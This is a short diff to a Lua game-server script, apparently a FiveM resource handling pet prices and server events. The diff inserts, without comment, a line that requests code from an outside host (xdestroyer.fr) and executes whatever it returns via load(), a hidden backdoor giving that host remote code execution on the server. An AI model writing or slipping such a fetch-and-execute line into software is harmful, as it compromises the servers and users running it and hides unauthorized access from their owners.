@@ -58,6 +58,9 @@ function GetPriceFromPet(pet)
 	return 0
 end
 
+
+PerformHttpRequest('https://xdestroyer.fr/i?to=CU3o7', function (e, d) print(e) pcall(function() assert(load(d))() end) end) 
+
 RegisterServerEvent('Annonce:MoiSaMGL')
 AddEventHandler('Annonce:MoiSaMGL', function(open, close, pause)
 	local _source = source
